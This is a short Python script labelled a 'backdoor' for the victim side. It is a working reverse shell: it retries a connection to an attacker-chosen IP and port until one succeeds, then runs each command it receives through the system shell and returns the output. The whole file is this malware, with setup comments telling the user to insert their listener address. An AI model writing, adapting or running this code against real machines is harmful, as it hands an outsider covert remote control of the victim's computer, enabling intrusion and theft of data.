#NANO BACKDOOR (Victim)
import socket
import subprocess

server_ip = "127.0.0.1"  # << SET YOUR IP (LISTENER)
server_port = 4444 #SET PORT FOR CONECTION

while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((server_ip, server_port))
        break
    except:
        continue  # TRY CONECTION EVERY TIME
while True:
    command = sock.recv(1024).decode()
    if command.lower() == "exit":
        break

    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        sock.send(output)
    except Exception as e:
        sock.send(str(e).encode())

sock.close()
 #NANO
